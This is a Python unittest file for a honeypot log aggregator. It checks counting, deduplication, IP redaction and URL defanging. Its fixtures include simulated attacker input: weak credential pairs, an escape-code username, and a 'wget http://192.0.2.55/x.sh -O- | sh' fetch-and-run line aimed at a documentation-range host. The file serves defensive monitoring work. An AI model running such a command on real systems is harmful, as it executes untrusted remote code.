"""Tests for vps/aggregate.py. Run: python3 -m unittest discover -s tests

All IPs below are from documentation ranges (RFC 5737), never real hosts.
"""

import json
import os
import sys
import tempfile
import unittest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "vps"))
import aggregate  # noqa: E402

HONEYPOT_IP = "203.0.113.10"


def ev(eventid, ts, **kw):
    return json.dumps({"eventid": eventid, "timestamp": ts, **kw})


DAY1 = [
    ev("cowrie.session.connect", "2026-11-01T01:00:00.000Z", src_ip="198.51.100.7", protocol="ssh"),
    ev("cowrie.client.version", "2026-11-01T01:00:01.000Z", src_ip="198.51.100.7", version="SSH-2.0-Go"),
    ev("cowrie.login.failed", "2026-11-01T01:00:02.000Z", src_ip="198.51.100.7", username="root", password="123456"),
    ev("cowrie.login.success", "2026-11-01T01:00:03.000Z", src_ip="198.51.100.7", username="root", password="admin"),
    ev("cowrie.command.input", "2026-11-01T01:00:04.000Z", src_ip="198.51.100.7",
       input=f"cd /tmp; wget http://192.0.2.55/x.sh -O- | sh # {HONEYPOT_IP}"),
    ev("cowrie.session.file_download", "2026-11-01T01:00:05.000Z", src_ip="198.51.100.7",
       url="http://192.0.2.55/x.sh", shasum="ab" * 32),
    "not json at all",
    ev("cowrie.session.connect", "2026-11-01T02:00:00.000Z", src_ip="198.51.100.8", protocol="telnet"),
    ev("cowrie.login.failed", "2026-11-01T02:00:01.000Z", src_ip="198.51.100.8",
       username="admin\x1b[31m", password="x" * 300),
]
LIVE = [
    ev("cowrie.session.connect", "2026-11-02T03:00:00.000Z", src_ip="198.51.100.7", protocol="ssh"),
    ev("cowrie.login.failed", "2026-11-02T03:00:01.000Z", src_ip="198.51.100.7", username="root", password="123456"),
    ev("cowrie.session.connect", "2026-11-02T03:00:00.000Z", src_ip="198.51.100.99", protocol="ssh"),
]


class AggregateTest(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        d = self.tmp.name
        self.logs, self.state, self.out = (os.path.join(d, x) for x in ("logs", "state", "stats.json"))
        os.makedirs(self.logs)
        self.write("cowrie.json.2026-11-01", DAY1)
        self.write("cowrie.json", LIVE)

    def tearDown(self):
        self.tmp.cleanup()

    def write(self, name, lines):
        with open(os.path.join(self.logs, name), "w") as fh:
            fh.write("\n".join(lines) + "\n")

    def run_agg(self):
        aggregate.main(["--logs", self.logs, "--state", self.state, "--out", self.out,
                        "--redact", HONEYPOT_IP, "--exclude-ip", "198.51.100.99"])
        with open(self.out) as fh:
            raw = fh.read()
        return raw, json.loads(raw)

    def test_totals(self):
        _, s = self.run_agg()
        t = s["totals"]
        self.assertEqual(t["sessions"], 3)           # .99 is excluded
        self.assertEqual(t["unique_sources"], 2)
        self.assertEqual(t["login_attempts"], 4)
        self.assertEqual(t["logins_accepted"], 1)
        self.assertEqual(t["telnet_sessions"], 1)
        self.assertEqual([d["day"] for d in s["daily"]], ["2026-11-01", "2026-11-02"])
        self.assertEqual(s["top"]["passwords"][0], {"value": "123456", "count": 2})

    def test_nothing_private_or_live_is_published(self):
        raw, s = self.run_agg()
        for needle in ("198.51.100", HONEYPOT_IP, "192.0.2.55", "http://", "\x1b"):
            self.assertNotIn(needle, raw)
        self.assertIn("[honeypot-ip]", raw)
        self.assertIn("hxxp[:]//192[.]0[.]2[.]55/x.sh", raw)
        self.assertTrue(all(len(p["value"]) <= aggregate.MAX_LEN for p in s["top"]["passwords"]))

    def test_rerun_does_not_double_count(self):
        self.run_agg()
        _, s = self.run_agg()
        self.assertEqual(s["totals"]["sessions"], 3)

    def test_history_survives_raw_log_cleanup(self):
        self.run_agg()
        os.remove(os.path.join(self.logs, "cowrie.json.2026-11-01"))
        _, s = self.run_agg()
        self.assertEqual(s["totals"]["sessions"], 3)
        self.assertEqual(s["downloads"][0]["sha256"], "ab" * 32)

    def test_empty(self):
        os.remove(os.path.join(self.logs, "cowrie.json.2026-11-01"))
        os.remove(os.path.join(self.logs, "cowrie.json"))
        _, s = self.run_agg()
        self.assertEqual(s["totals"]["sessions"], 0)
        self.assertIsNone(s["first_day"])


if __name__ == "__main__":
    unittest.main()
